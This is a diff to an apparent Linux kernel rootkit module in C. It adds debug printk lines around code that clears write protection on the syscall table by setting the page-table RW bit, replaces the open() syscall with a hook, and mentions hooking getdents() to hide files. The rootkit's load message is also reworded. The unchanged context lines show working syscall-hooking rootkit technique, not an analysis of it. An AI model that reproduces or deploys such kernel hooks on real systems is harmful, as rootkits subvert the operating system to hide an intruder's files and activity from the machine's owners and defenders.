@@ -66,11 +66,15 @@ void set_addr_rw(const unsigned long addr)
   //Get the page table entry structure containing the address we pass.
   //Level will be set to the page depth for the entry.
   pte_t *pte = lookup_address(addr, &level);
+  printk(KERN_INFO "lookup_address function did not crash in rw\n");
 
   //If the page permissions bitmask doesn't have _PAGE_RW, mask it in
   //with the _PAGE_RW flag.
-  if(pte->pte &~ _PAGE_RW)
+  if(pte->pte &~ _PAGE_RW) {
+    printk(KERN_INFO "Went into if in lookup_address\n");
     pte->pte |= _PAGE_RW;
+  }
+  printk(KERN_INFO "After if in lookup_address\n");
 }
 
 /*
@@ -81,6 +85,7 @@ void set_addr_ro(const unsigned long addr)
   unsigned int level;
 
   pte_t *pte = lookup_address(addr, &level);
+  printk(KERN_INFO "lookup_address function did not crash in ro\n");
   pte->pte = pte->pte &~_PAGE_RW;
 }
 
@@ -93,6 +98,8 @@ int hook_syscall(t_syscall_hook *hook)
   //If this syscall_hook has already been put in place, abort.
   if(hook->hooked)
     return 0;
+
+  printk(KERN_INFO "In hook_syscall, and hook->hooked is true\n");
 
   //Get & store the original syscall from the syscall_table using the offset
   hook->orig_func   = sys_call_table[hook->offset];
@@ -112,6 +119,7 @@ int hook_syscall(t_syscall_hook *hook)
   set_addr_rw((unsigned long) sys_call_table);
 
   sys_call_table[hook->offset] = hook->hook_func;
+  printk(KERN_INFO "Write op to sys_call_table in hook_syscall did not crash\n");
 
   set_addr_ro((unsigned long) sys_call_table);
 
@@ -225,11 +233,14 @@ int init_module(void)
   //	memory RW (see notes above).
   //********
   set_addr_rw((unsigned long) sys_call_table);
+  printk(KERN_INFO "After call to set_addr_rw\n");
 
   //Let's hook open() for an example of how to use the framework
   hook_syscall(new_hook(__NR_open, (void*) &new_open));
+  printk(KERN_INFO "After call to hook_syscall\n");
 
   set_addr_ro((unsigned long) sys_call_table);
+  printk(KERN_INFO "After call to set_addr_ro\n");
 
 
   //********
@@ -240,7 +251,7 @@ int init_module(void)
   // Let's hook getdents() to hide our files
 
 
-  printk(KERN_INFO "Rootkit module is loaded!\n");
+  printk(KERN_INFO "Rootkit module loaded successfully!\n");
   return 0; //For successful load
 }
 
